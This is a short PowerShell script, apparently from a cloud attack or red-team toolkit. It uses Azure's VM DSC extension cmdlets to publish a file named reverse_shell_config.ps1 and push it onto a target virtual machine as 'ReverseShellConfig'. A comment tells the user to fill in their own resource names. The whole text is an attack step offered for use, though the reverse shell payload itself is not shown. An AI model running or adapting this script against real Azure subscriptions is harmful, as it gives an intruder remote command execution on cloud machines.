# Match with your resource names
$resourceGroup = 'IAAS'
$vmName = 'fed01'
$storageName = 'iiasdiag'

Publish-AzVMDscConfiguration -ConfigurationPath .\reverse_shell_config.ps1 -ResourceGroupName $resourceGroup -StorageAccountName $storageName -force
Set-AzVMDscExtension -Version '2.80' -ResourceGroupName $resourceGroup -VMName $vmName -ArchiveStorageAccountName $storageName -ArchiveBlobName 'rsconfig.ps1.zip' -AutoUpdate -ConfigurationName 'ReverseShellConfig'
